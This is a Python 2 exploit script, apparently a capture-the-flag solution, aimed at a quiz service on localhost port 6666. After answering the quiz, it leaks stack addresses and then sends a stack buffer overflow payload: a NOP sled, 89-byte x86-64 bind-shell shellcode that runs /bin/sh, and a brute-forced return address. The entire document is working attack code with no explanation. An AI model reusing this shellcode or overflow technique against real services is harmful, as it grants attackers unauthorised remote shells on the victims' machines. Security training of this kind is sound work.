from socket import *
from struct import pack, unpack
import time
import sys

host = "localhost"
port = 6666

# 89 bytes
bindshell = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xba\xf2\xff\x13\x88\x66\x83\xf2\xf0\x52\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def solve_quiz(p):
    r = p.recv(4096)
    print r
    p.send("arsenal\n")

    time.sleep(0.5)
    r = p.recv(4096)
    print r
    p.send("gyeongbokgung\n")

    time.sleep(0.5)
    r = p.recv(4096)
    print r
    p.send("psy\n")

    time.sleep(0.5)
    r = p.recv(4096)
    print r
    

def get_shell(address):
    p = socket(AF_INET, SOCK_STREAM)
    # for brute force
    p.settimeout(30)
    p.connect((host, port))

    solve_quiz(p)

    payload = ""
    payload += "\x90" * 16
    payload += bindshell
    payload += "\x90" * (264 - len(payload))
    payload += pack("<Q", address)
    
    p.send(payload + "\n")

    time.sleep(0.5)
    r = p.recv(4096)
    print r + '\n'

    p.send("\n")

    
def get_leaked():
    p = socket(AF_INET, SOCK_STREAM)
    p.connect((host, port))

    solve_quiz(p)
    
    p.send('A' + '\x00' * 7)
    
    time.sleep(0.5)
    r = p.recv(4096)

    return dump_leaked(r)

def dump_leaked(d):
    # split bytes into 8byte data
    datas = [d[i:i+8] for i in range(0, len(d), 8)]
    # remove data except address
    filtered = filter(lambda n:"\x7f" in n, datas)
    # convert bytes to long
    address = map(lambda n:unpack("<Q", n)[0], filtered)

    return address


address = get_leaked()

for a in address:
    try:
        get_shell(a + 16)
    except Exception as e:
        if (e.args[0] == "timed out"):
            print "Success!!"
            sys.exit()